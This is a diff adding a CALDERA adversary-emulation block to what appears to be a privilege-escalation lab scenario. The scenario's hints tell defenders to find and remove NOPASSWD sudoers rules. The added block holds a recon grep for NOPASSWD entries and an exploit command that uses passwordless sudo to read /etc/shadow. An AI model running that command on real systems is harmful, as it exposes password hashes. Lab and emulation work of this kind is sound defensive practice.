@@ -19,3 +19,16 @@ hints:
   - "Check what sudo privileges are configured on the system"
   - "Look at files in /etc/sudoers.d/ for suspicious entries"
   - "Remove or fix any sudoers rules that bypass password requirements"
+caldera:
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.003
+    name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
+  recon:
+    description: "Check for NOPASSWD sudo entries"
+    command: |
+      grep -r NOPASSWD /etc/sudoers.d/ 2>/dev/null && echo "VULNERABLE: NOPASSWD sudo entry found" || echo "SECURE: no NOPASSWD entries"
+  exploit:
+    description: "Use NOPASSWD sudo to read sensitive files as root"
+    command: |
+      sudo -n cat /etc/shadow 2>/dev/null | head -3
